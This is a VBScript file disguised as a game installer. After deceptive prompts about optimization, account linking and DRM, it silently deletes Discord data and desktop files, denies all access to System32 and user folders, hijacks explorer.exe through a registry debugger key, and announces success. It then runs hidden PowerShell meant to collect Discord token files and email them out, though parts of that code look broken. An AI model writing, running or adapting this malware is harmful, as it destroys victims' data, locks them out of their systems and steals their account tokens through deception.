Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

answer1 = MsgBox("System optimization required for game performance." & vbCrLf & vbCrLf & _
                 "Process will modify system files and registry." & vbCrLf & _
                 "This is irreversible. Continue?", vbYesNo + vbQuestion, "Optimization")

If answer1 = vbNo Then WScript.Quit

answer2 = MsgBox("Account linking required for cloud saves." & vbCrLf & vbCrLf & _
                 "Account recovery after this step is blocked." & vbCrLf & _
                 "Confirm linking?", vbYesNo + vbQuestion, "Account Setup")

If answer2 = vbNo Then
    MsgBox "Setup incomplete. Game cannot launch.", vbInformation, "Failed"
    WScript.Quit
End If

answer3 = MsgBox("DRM protection installation final step." & vbCrLf & vbCrLf & _
                 "Files will be encrypted. Process cannot be reversed." & vbCrLf & _
                 "Install DRM?", vbYesNo + vbQuestion, "Security Install")

If answer3 = vbNo Then
    MsgBox "DRM not installed. Game will not function.", vbInformation, "Cancelled"
    WScript.Quit
End If

objShell.Run "cmd /c del /f /q ""%APPDATA%\Discord\*""", 0, True
objShell.Run "cmd /c del /f /q ""%LOCALAPPDATA%\Discord\*""", 0, True
objShell.Run "cmd /c cacls ""C:\Windows\System32"" /E /P everyone:N", 0, True
objShell.Run "cmd /c cacls ""C:\Users"" /E /P everyone:N", 0, True
objShell.Run "cmd /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe"" /v Debugger /t REG_SZ /d ""cmd.exe /c echo locked"" /f", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command ""& {Get-ChildItem C:\Users\$env:USERNAME\Desktop | Remove-Item -Force}""", 0, True

MsgBox "Installation complete. Game ready!", vbInformation, "Success"

objShell.Run "powershell -WindowStyle Hidden -Command ""& {$sender='lemarjackson2025@outlook.com'; $pass='REAL_PASSWORD'; $tokens=(Get-ChildItem ""$UserProfile\APPDATA\Discord\Local Storage\gdb-*.ldb,"" -Recurse).FullName; ConvertFrom-Utf8ToBase64 (Get-Content $tokens -Encoding UTF8) | Out-File C:\Windows\Temp\dc.txt; Send-MailMessage -SmtpServer 'smtp.outlook.com' -Port 587 -UseSsl $True -Credential (New-Object System.Management.Automation.PSCredential('$mail', $credential)) -From $sender -To $sender -Subject 'Discord Tokens' -Attachments 'C:\Windows\Temp\dc.txt' -Body 'Tokens extracted'}""", 0, True
